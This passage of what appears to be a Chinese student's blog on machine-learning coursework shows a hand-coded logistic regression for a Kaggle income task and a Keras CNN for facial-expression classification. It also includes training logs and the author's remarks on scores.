class="line"></span><br><span class="line">file_x = open(<span class="string">'X_train'</span>, <span class="string">'r'</span>)</span><br><span class="line">file_y = open(<span class="string">'Y_train'</span>, <span class="string">'r'</span>)</span><br><span class="line">file_xt = open(<span class="string">'X_test'</span>, <span class="string">'r'</span>)</span><br><span class="line">file_yt = open(<span class="string">'Y_test'</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x_train = y_train = x_test = []</span></span><br><span class="line"><span class="comment">#mu1 = mu2 = sigm = []</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_data</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x)):</span><br><span class="line">        x[i]=x[i].split(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(x[i])):</span><br><span class="line">            x[i][j]=int(x[i][j])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_col</span><span class="params">(x, a, xt)</span>:</span></span><br><span class="line">    mean_x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        mean_x += x[i][a]</span><br><span class="line">    mean_x /= len(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        x[i][a] /= mean_x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(xt)):</span><br><span class="line">        xt[i][a] /= mean_x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> x_train, y_train, x_test, x_val, y_val</span><br><span class="line">    x_train = file_x.readlines()[<span class="number">1</span>:]</span><br><span class="line">    y_train = file_y.readlines()[<span class="number">1</span>:]</span><br><span class="line">    x_test = file_xt.readlines()[<span class="number">1</span>:]</span><br><span class="line">    </span><br><span class="line">    deal_data(x_train)</span><br><span class="line">    deal_data(y_train)</span><br><span class="line">    deal_data(x_test)</span><br><span class="line">    </span><br><span class="line">    deal_col(x_train, <span class="number">0</span>, x_test)</span><br><span class="line">    deal_col(x_train, <span class="number">1</span>, x_test)</span><br><span class="line">    deal_col(x_train, <span class="number">3</span>, x_test)</span><br><span class="line">    deal_col(x_train, <span class="number">4</span>, x_test)</span><br><span class="line">    deal_col(x_train, <span class="number">5</span>, x_test)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    x = x_train</span><br><span class="line">    y = y_train</span><br><span class="line">    x_train, x_val = x[:<span class="number">20000</span>], x[<span class="number">20000</span>:]</span><br><span class="line">    y_train, y_val = y[:<span class="number">20000</span>], y[<span class="number">20000</span>:]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>/(<span class="number">1</span>+np.exp(-z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_loss</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> w, b, dim</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> x_train, y_train, x_test, x_val, y_val</span><br><span class="line">    <span class="keyword">global</span> w, b, dim</span><br><span class="line">    w = []</span><br><span class="line">    dim = len(x_train[<span class="number">0</span>])</span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    lr = <span class="number">1</span></span><br><span class="line">    y = []</span><br><span class="line">    reg_rate = <span class="number">0.001</span></span><br><span class="line">    </span><br><span class="line">    gradient_w_sum = []</span><br><span class="line">    gradient_b_sum = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">        w.append(<span class="number">1</span>)</span><br><span class="line">        gradient_w_sum.append(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        print(t, <span class="string">' testing...'</span>, end=<span class="string">''</span>)</span><br><span class="line">        y = []</span><br><span class="line">        err = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x_train)):</span><br><span class="line">            y.append(b)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">                y[i] += x_train[i][j]*w[j]</span><br><span class="line">            y[i] = sigmoid(y[i])</span><br><span class="line">            <span class="keyword">if</span> (y[i]&gt;<span class="number">0.5</span>) != y_train[i][<span class="number">0</span>]:</span><br><span class="line">                err += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        print(<span class="string">' train acc:'</span>, <span class="number">1</span>-err/len(x_train), end=<span class="string">''</span>)</span><br><span class="line">        </span><br><span class="line">        err = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x_val)):</span><br><span class="line">            yt = b</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">                yt += x_val[i][j]*w[j]</span><br><span class="line">            yt = sigmoid(yt)</span><br><span class="line">            <span class="keyword">if</span> (yt&gt;<span class="number">0.5</span>) != y_val[i][<span class="number">0</span>]:</span><br><span class="line">                err += <span class="number">1</span></span><br><span class="line">        print(<span class="string">' val acc:'</span>, <span class="number">1</span>-err/len(x_val))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">            gradient_w = <span class="number">2</span>*reg_rate*w[i]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(x_train)):</span><br><span class="line">                gradient_w += -(y_train[j][<span class="number">0</span>]-y[j])*x_train[j][i]</span><br><span class="line">            gradient_w = gradient_w/len(x_train)</span><br><span class="line">            gradient_w_sum[i] += gradient_w**<span class="number">2</span></span><br><span class="line">            w[i] = w[i] - lr/np.sqrt(gradient_w_sum[i])*gradient_w</span><br><span class="line"></span><br><span class="line">        gradient_b = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x_train)):</span><br><span class="line">            gradient_b += -(y_train[i][<span class="number">0</span>]-y[i])</span><br><span class="line">            </span><br><span class="line">        gradient_b = gradient_b/len(x_train)</span><br><span class="line">        gradient_b_sum += gradient_b**<span class="number">2</span></span><br><span class="line">        b = b - lr/np.sqrt(gradient_b_sum)*gradient_b</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_probability</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> w, b, dim</span><br><span class="line">    z = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">       z += w[i]*x[i]</span><br><span class="line">    z += b</span><br><span class="line">    <span class="keyword">return</span> sigmoid(z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_predict</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="comment"># print(get_probability(x))</span></span><br><span class="line">    <span class="keyword">if</span> get_probability(x)&gt;<span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'id,label'</span>, file=file_yt)</span><br><span class="line">    nn = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x_test)):</span><br><span class="line">        <span class="keyword">if</span> get_predict(x_test[i])==<span class="number">0</span>:</span><br><span class="line">            nn += <span class="number">1</span></span><br><span class="line">        print(i+<span class="number">1</span>, get_predict(x_test[i]),sep=<span class="string">','</span>, file=file_yt)</span><br><span class="line">    print(nn, len(x_test))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    load_data()</span><br><span class="line">    print(<span class="string">'load_data() ok'</span>)</span><br><span class="line">    train()</span><br><span class="line">    print(<span class="string">'train() ok'</span>)</span><br><span class="line">    print(w, b)</span><br><span class="line">    test()</span><br><span class="line">    print(<span class="string">'test() ok'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我又修改了一下处理数据那部分，把范围大的变成$\frac{x-\min\{x\}}{\max\{x\}-\min\{x\}}$<br>结果稍差了一丢丢<code>private:0.84903 public:0.85282</code><br>不管了…看后面的了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_col</span><span class="params">(x, a, xt)</span>:</span></span><br><span class="line">    mxx = x[<span class="number">0</span>][a]</span><br><span class="line">    mix = x[<span class="number">0</span>][a]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        mxx = max(mxx, x[i][a])</span><br><span class="line">        mix = min(mix, x[i][a])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        x[i][a] = (x[i][a]-mix)/(mxx-mix)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(xt)):</span><br><span class="line">        xt[i][a] = (xt[i][a]-mix)/(mxx-mix)</span><br></pre></td></tr></table></figure><h2 id="hw3"><a href="#hw3" class="headerlink" title="hw3"></a>hw3</h2><p><a href="https://www.kaggle.com/c/ml2019spring-hw3" target="_blank" rel="noopener">https://www.kaggle.com/c/ml2019spring-hw3</a><br><a href="https://ntumlta2019.github.io/ml-web-hw3/" target="_blank" rel="noopener">作业说明</a></p><h3 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h3><p>要做的是一个人脸表情的分类<br>数据处理的部分用了好长时间，主要是显式循环太致命了…我还不太会处理csv，所以直接暴力读文件处理了<br>这是最一开始写的，得到的output是这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Epoch 1/20</span><br><span class="line">2019-07-30 23:58:40.386315: I tensorflow/core/platform/cpu_feature_guard.cc:142] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span><br><span class="line">2019-07-30 23:58:40.410366: I tensorflow/core/platform/profile_utils/cpu_utils.cc:94] CPU Frequency: 2494135000 Hz</span><br><span class="line">2019-07-30 23:58:40.411071: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5616a3e35300 executing computations on platform Host. Devices:</span><br><span class="line">2019-07-30 23:58:40.411112: I tensorflow/compiler/xla/service/service.cc:175]   StreamExecutor device (0): &lt;undefined&gt;, &lt;undefined&gt;</span><br><span class="line">2019-07-30 23:58:40.587853: W tensorflow/compiler/jit/mark_for_compilation_pass.cc:1412] (One-time warning): Not using XLA:CPU for cluster because envvar TF_XLA_FLAGS=--tf_xla_cpu_global_jit was not set.  If you want XLA:CPU, either set that envvar, or use experimental_jit_scope to enable XLA:CPU.  To confirm that XLA is active, pass --vmodule=xla_compilation_cache=1 (as a proper command-line flag, not via TF_XLA_FLAGS) or set the envvar XLA_FLAGS=--xla_hlo_profile.</span><br><span class="line">28709/28709 [==============================] - 21s 724us/step - loss: 1.6676 - acc: 0.3480</span><br><span class="line">Epoch 2/20</span><br><span class="line">28709/28709 [==============================] - 21s 715us/step - loss: 1.5076 - acc: 0.4226</span><br><span class="line">Epoch 3/20</span><br><span class="line">28709/28709 [==============================] - 21s 748us/step - loss: 1.3983 - acc: 0.4698</span><br><span class="line">Epoch 4/20</span><br><span class="line">28709/28709 [==============================] - 21s 737us/step - loss: 1.2961 - acc: 0.5130</span><br><span class="line">Epoch 5/20</span><br><span class="line">28709/28709 [==============================] - 21s 742us/step - loss: 1.1895 - acc: 0.5582</span><br><span class="line">Epoch 6/20</span><br><span class="line">28709/28709 [==============================] - 21s 739us/step - loss: 1.0732 - acc: 0.6067</span><br><span class="line">Epoch 7/20</span><br><span class="line">28709/28709 [==============================] - 22s 772us/step - loss: 0.9517 - acc: 0.6570</span><br><span class="line">Epoch 8/20</span><br><span class="line">28709/28709 [==============================] - 23s 797us/step - loss: 0.8311 - acc: 0.7044</span><br><span class="line">Epoch 9/20</span><br><span class="line">28709/28709 [==============================] - 23s 792us/step - loss: 0.7124 - acc: 0.7521</span><br><span class="line">Epoch 10/20</span><br><span class="line">28709/28709 [==============================] - 22s 769us/step - loss: 0.6000 - acc: 0.7962</span><br><span class="line">Epoch 11/20</span><br><span class="line">28709/28709 [==============================] - 22s 759us/step - loss: 0.5022 - acc: 0.8347</span><br><span class="line">Epoch 12/20</span><br><span class="line">28709/28709 [==============================] - 23s 793us/step - loss: 0.4063 - acc: 0.8699</span><br><span class="line">Epoch 13/20</span><br><span class="line">28709/28709 [==============================] - 23s 800us/step - loss: 0.3259 - acc: 0.9009</span><br><span class="line">Epoch 14/20</span><br><span class="line">28709/28709 [==============================] - 23s 793us/step - loss: 0.2617 - acc: 0.9235</span><br><span class="line">Epoch 15/20</span><br><span class="line">28709/28709 [==============================] - 23s 790us/step - loss: 0.1984 - acc: 0.9473</span><br><span class="line">Epoch 16/20</span><br><span class="line">28709/28709 [==============================] - 23s 801us/step - loss: 0.1556 - acc: 0.9639</span><br><span class="line">Epoch 17/20</span><br><span class="line">28709/28709 [==============================] - 23s 789us/step - loss: 0.1387 - acc: 0.9668</span><br><span class="line">Epoch 18/20</span><br><span class="line">28709/28709 [==============================] - 22s 768us/step - loss: 0.1521 - acc: 0.9577</span><br><span class="line">Epoch 19/20</span><br><span class="line">28709/28709 [==============================] - 23s 818us/step - loss: 0.0914 - acc: 0.9804</span><br><span class="line">Epoch 20/20</span><br><span class="line">28709/28709 [==============================] - 22s 755us/step - loss: 0.0693 - acc: 0.9884</span><br><span class="line">28709/28709 [==============================] - 11s 392us/step</span><br><span class="line"></span><br><span class="line">Train Acc: 0.9921975671163343</span><br></pre></td></tr></table></figure></p><p>提交得到的分数很低<code>private:0.47394 public:0.49456</code><br>我觉得是batch_size和epochs没设置好，明天调<br>有一个地方就是Conv2D的Dimension一开始实在是没搞懂，好像必须要3维才可以，然后就搞成我写的这样可以成功运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers.core <span class="keyword">import</span> Dense, Dropout, Activation</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Conv2D, MaxPooling2D, Flatten</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD, Adam</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> np_utils</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    train_f = open(<span class="string">'train.csv'</span>, <span class="string">'r'</span>)</span><br><span class="line">    test_f = open(<span class="string">'test.csv'</span>, <span class="string">'r'</span>)</span><br><span class="line">    train_data = train_f.readlines()[<span class="number">1</span>:]</span><br><span class="line">    test_data = test_f.readlines()[<span class="number">1</span>:]</span><br><span class="line">    </span><br><span class="line">    x_train = []</span><br><span class="line">    y_train = []</span><br><span class="line">    x_test = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(train_data)):</span><br><span class="line">        train_data[i]=train_data[i].split(<span class="string">','</span>)</span><br><span class="line">        x_train.append(train_data[i][<span class="number">1</span>].split(<span class="string">' '</span>))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(x_train[i])):</span><br><span class="line">            x_train[i][j]=int(x_train[i][j])</span><br><span class="line">        y_train.append(int(train_data[i][<span class="number">0</span>]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(test_data)):</span><br><span class="line">        test_data[i]=test_data[i].split(<span class="string">','</span>)</span><br><span class="line">        x_test.append(test_data[i][<span class="number">1</span>].split(<span class="string">' '</span>))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(x_test[i])):</span><br><span class="line">            x_test[i][j]=int(x_test[i][j])</span><br><span class="line">    </span><br><span class="line">    x = np.array(x_train)</span><br><span class="line">    y = np.array(y_train)</span><br><span class="line">    xx = np.array(x_test)</span><br><span class="line">    </span><br><span class="line">    x_train = x</span><br><span class="line">    y_train = y</span><br><span class="line">    x_test = xx</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># deal data</span></span><br><span class="line">    total_data = x_train.shape[<span class="number">0</span>]</span><br><span class="line">    x_train = x_train.reshape(total_data, <span class="number">48</span>, <span class="number">48</span>, <span class="number">1</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">48</span>, <span class="number">48</span>, <span class="number">1</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_train = x_train / <span class="number">255</span></span><br><span class="line">    x_test = x_test / <span class="number">255</span></span><br><span class="line">    </span><br><span class="line">    y_train = np_utils.to_categorical(y_train, <span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x_train, y_train, x_test</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(x_train, y_train)</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">25</span>, (<span class="number">6</span>, <span class="number">6</span>), input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">100</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">7</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'softmax'</span>))</span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    model.fit(x_train, y_train, batch_size = <span class="number">100</span>, epochs = <span class="number">20</span>)</span><br><span class="line">    result = model.evaluate(x_train, y_train, batch_size=<span class="number">10</span>)</span><br><span class="line">    print(<span class="string">'\nTrain Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(model, x_test)</span>:</span></span><br><span class="line">    y_test = model.predict(x_test)</span><br><span class="line">    test_f = open(<span class="string">'y_test.csv'</span>, <span class="string">'w'</span>)</span><br><span class="line">    print(<span class="string">'id,label'</span>, file=test_f)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y_test)):</span><br><span class="line">        print(i, np.argmax(y_test[i]), sep=<span class="string">','</span>, file=test_f)</span><br><span class="line">    test_f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x_train, y_train, x_test = load_data()</span><br><span class="line">    print(<span class="string">'load_data() ok'</span>)</span><br><span class="line">    model = train(x_train, y_train)</span><br><span class="line">    print(<span class="string">'train() ok'</span>)</span><br><span class="line">    test(model, x_test)</span><br><span class="line">    print(<span class="string">'test() ok'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>后来我改了一下，得分<code>private: 0.45500 public:0.45583</code>，还是不太行嗷，回头改一下Model，我先睡了zzz<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(x_train, y_train)</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">25</span>, (<span class="number">6</span>, <span class="number">6</span>), input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">100</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">7</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'softmax'</span>))</span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    model.fit(x_train, y_train, batch_size = <span class="number">10</span>, epochs = <span class="number">20</span>)</span><br><span class="line">    result = model.evaluate(x_train, y_train, batch_size=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'\nTrain Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure></p><p>output<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">Epoch 1/20</span><br><span class="line">2019-07-31 00:08:55.510380: I tensorflow/core/platform/cpu_feature_guard.cc:142] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span><br><span class="line">2019-07-31 00:08:55.534347: I tensorflow/core/platform/profile_utils/cpu_utils.cc:94] CPU Frequency: 2494135000 Hz</span><br><span class="line">2019-07-31 00:08:55.535015: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5639b5442300 executing computations on platform Host. Devices:</span><br><span class="line">2019-07-31 00:08:55.535039: I tensorflow/compiler/xla/service/service.cc:175]   StreamExecutor device (0): &lt;undefined&gt;, &lt;undefined&gt;</span><br><span class="line">2019-07-31 00:08:55.662054: W tensorflow/compiler/jit/mark_for_compilation_pass.cc:1412] (One-time warning): Not using XLA:CPU for cluster because envvar TF_XLA_FLAGS=--tf_xla_cpu_global_jit was not set.  If you want XLA:CPU, either set that envvar, or use experimental_jit_scope to enable XLA:CPU.  To confirm that XLA is active, pass --vmodule=xla_compilation_cache=1 (as a proper command-line flag, not via TF_XLA_FLAGS) or set the envvar XLA_FLAGS=--xla_hlo_profile.</span><br><span class="line">28709/28709 [==============================] - 75s 3ms/step - loss: 1.6555 - acc: 0.3503</span><br><span class="line">Epoch 2/20</span><br><span class="line">28709/28709 [==============================] - 85s 3ms/step - loss: 1.5076 - acc: 0.4157</span><br><span class="line">Epoch 3/20</span><br><span class="line">28709/28709 [==============================] - 83s 3ms/step - loss: 1.4020 - acc: 0.4644</span><br><span class="line">Epoch 4/20</span><br><span class="line">28709/28709 [==============================] - 84s 3ms/step - loss: 1.3111 - acc: 0.5012</span><br><span class="line">Epoch 5/20</span><br><span class="line">28709/28709 [==============================] - 81s 3ms/step - loss: 1.2128 - acc: 0.5410</span><br><span class="line">Epoch 6/20</span><br><span class="line">28709/28709 [==============================] - 83s 3ms/step - loss: 1.1142 - acc: 0.5840</span><br><span class="line">Epoch 7/20</span><br><span class="line">28709/28709 [==============================] - 82s 3ms/step - loss: 1.0072 - acc: 0.6264</span><br><span class="line">Epoch 8/20</span><br><span class="line">28709/28709 [==============================] - 82s 3ms/step - loss: 0.9050 - acc: 0.6643</span><br><span class="line">Epoch 9/20</span><br><span class="line">28709/28709 [==============================] - 81s 3ms/step - loss: 0.8023 - acc: 0.7046</span><br><span class="line">Epoch 10/20</span><br><span class="line">28709/28709 [==============================] - 81s 3ms/step - loss: 0.7115 - acc: 0.7392</span><br><span class="line">Epoch 11/20</span><br><span class="line">28709/28709 [==============================] - 77s 3ms/step - loss: 0.6215 - acc: 0.7720</span><br><span class="line">Epoch 12/20</span><br><span class="line">28709/28709 [==============================] - 74s 3ms/step - loss: 0.5508 - acc: 0.7971</span><br><span class="line">Epoch 13/20</span><br><span class="line">28709/28709 [==============================] - 76s 3ms/step - loss: 0.4865 - acc: 0.8204</span><br><span class="line">Epoch 14/20</span><br><span class="line">28709/28709 [==============================] - 77s 3ms/step - loss: 0.4371 - acc: 0.8413</span><br><span class="line">Epoch 15/20</span><br><span class="line">28709/28709 